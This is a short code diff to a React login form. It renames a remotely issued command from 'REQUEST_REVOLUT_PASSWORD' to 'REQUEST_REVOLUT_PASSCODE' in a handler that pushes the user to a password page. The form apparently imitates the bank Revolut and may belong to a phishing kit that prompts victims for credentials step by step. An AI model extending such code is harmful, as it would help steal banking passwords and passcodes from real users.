@@ -25,7 +25,7 @@ export default function LoginForm() {
             console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
             // setInvalid(true); // Show error state for email input
             // setIsLoading(false);
-        } else if (command === 'REQUEST_REVOLUT_PASSWORD') {
+        } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
             // setIsLoading(false);
             setTimeout(() => {
                 // setIsLoading(false);
